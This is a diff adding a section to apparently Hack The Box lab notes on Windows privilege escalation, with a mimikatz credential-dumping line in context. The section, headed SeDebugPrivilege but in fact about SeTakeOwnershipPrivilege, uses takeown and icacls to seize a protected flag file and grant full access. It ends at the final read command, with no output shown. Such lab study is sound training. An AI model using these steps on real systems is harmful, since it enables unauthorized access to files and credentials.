@@ -197,5 +197,102 @@ mimikatz # sekurlsa::logonpasswords
 ![image](https://github.com/user-attachments/assets/609b3a2d-887b-4c8b-bb74-4b21deb9efa8)
 
 
+## SeDebugPrivilege
+
+Step 1: Verify available privileges
+```bash
+whoami /priv
+```
+Output:
+```bash
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                              State
+============================= ======================================== ========
+SeTakeOwnershipPrivilege      Take ownership of files or other objects Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set           Enabled
+```
+We have `SeTakeOwnershipPrivilege` enabled, which allows us to take ownership of objects like files and folders.
+
+Step 2: Check the file ownership of flag.txt
+```bash
+Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | Select Fullname, LastWriteTime, Attributes, @{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
+```
+Output:
+```bash
+FullName            LastWriteTime        Attributes Owner
+--------            -------------        ---------- -----
+C:\TakeOwn\flag.txt 6/4/2021 11:24:47 AM Archive    
+```
+The current Owner is not displayed, which means we don't own it yet.
+
+Step 3: Verify ownership with cmd
+```bash
+cmd /c dir /q 'C:\TakeOwn\flag.txt'
+```
+Output:
+```bash
+ Volume in drive C has no label.
+ Volume Serial Number is 0C92-675B
+
+ Directory of C:\TakeOwn
+
+06/04/2021  11:24 AM                22 ...                    flag.txt
+```
+
+Step 4: Take ownership of the file using takeown
+```bash
+takeown /f 'C:\TakeOwn\flag.txt'
+```
+Output:
+```bash
+SUCCESS: The file (or folder): "C:\TakeOwn\flag.txt" now owned by user "WINLPE-SRV01\htb-student".
+```
+We are now the Owner of the file, which allows us to modify its permissions.
+
+Step 5: Verify new ownership
+```bash
+Get-ChildItem -Path 'C:\TakeOwn\flag.txt' | Select Fullname, LastWriteTime, Attributes, @{Name="Owner";Expression={ (Get-Acl $_.FullName).Owner }}
+```
+Output:
+```bash
+FullName            LastWriteTime        Attributes Owner
+--------            -------------        ---------- -----
+C:\TakeOwn\flag.txt 6/4/2021 11:24:47 AM Archive    WINLPE-SRV01\htb-student
+```
+Ownership has successfully transferred to the htb-student user.
+
+Step 6: Attempt to read the file
+```bash
+cat 'C:\TakeOwn\flag.txt'
+```
+Output:
+```bash
+cat : Access to the path 'C:\TakeOwn\flag.txt' is denied.
+At line:1 char:1
++ cat 'C:\TakeOwn\flag.txt'
++ ~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : PermissionDenied: (C:\TakeOwn\flag.txt:String) [Get-Content], UnauthorizedAccessException
+    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
+```
+We own the file, but we do not have the necessary permissions to read it.
+
+Step 7: Grant full access to the current user
+```bash
+icacls 'C:\TakeOwn\flag.txt' /grant htb-student:F
+```
+Output:
+```bash
+processed file: C:\TakeOwn\flag.txt
+Successfully processed 1 files; Failed processing 0 files
+```
+We have now given ourselves Full Control over the file.
+
+Step 8: Read the contents of the flag file
+```bash
+cat 'C:\TakeOwn\flag.txt'
+```
 
 
